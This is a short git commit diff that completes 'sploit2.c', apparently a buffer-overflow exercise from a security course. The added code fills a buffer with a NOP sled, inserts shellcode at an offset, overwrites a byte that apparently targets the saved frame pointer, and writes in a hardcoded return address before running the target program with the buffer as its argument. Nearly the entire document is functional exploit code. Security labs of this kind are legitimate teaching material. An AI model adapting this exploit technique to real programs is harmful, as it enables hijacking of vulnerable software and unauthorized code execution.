2b6f1f2159cf23e926eddf443f0756e90747157b
Peter C <peter@drifty.com>
2014-02-09 19:21:43 -0800

    Finished sploit2

--- sploits/sploit2.c
+++ sploits/sploit2.c
@@ -10,8 +10,17 @@ int main(void)
 {
   char *args[3];
   char *env[1];
+  char buf[241];
+  memset(buf, 0x90, 241);
 
-  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
+  strncpy(buf+191, shellcode, 45);
+  strncpy(buf+240, "\x70", 1);
+  strncpy(buf+236, "\x08\xfd\xff\xbf", 4);
+  //strncpy(buf+244, "\x12\x34\x56\x78", 4);
+  
+  args[0] = TARGET; 
+  args[1] = buf;
+  args[2] = NULL;
   env[0] = NULL;
 
   if (0 > execve(TARGET, args, env))
